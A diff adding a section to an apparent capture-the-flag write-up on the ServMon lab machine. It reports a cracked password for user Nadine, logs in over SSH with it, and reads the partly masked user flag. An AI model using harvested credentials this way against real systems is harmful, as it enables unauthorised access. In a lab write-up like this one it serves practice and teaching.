@@ -459,3 +459,30 @@ SMB         10.10.10.184    445    SERVMON          [+] ServMon\Nadine:L1k3B1gBu
 ```
 
 <br />
+
+We have a valid match -> Nadine:L1k3B1gBut7s@W0rk
+
+<br />
+
+# SSH - Nadine:
+
+<br />
+
+Port 22 is open, so we try to connect as Nadine with the valid password:
+
+<br />
+
+```bash
+❯ ssh Nadine@10.10.10.184
+Nadine@10.10.10.184's password:
+Microsoft Windows [Version 10.0.17763.864]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+nadine@SERVMON C:\Users\Nadine>whoami
+servmon\nadine
+
+nadine@SERVMON C:\Users\Nadine>type Desktop\user.txt 
+f18f32659ac6e495aa59ee53fexxxxxx
+```
+
+<br />
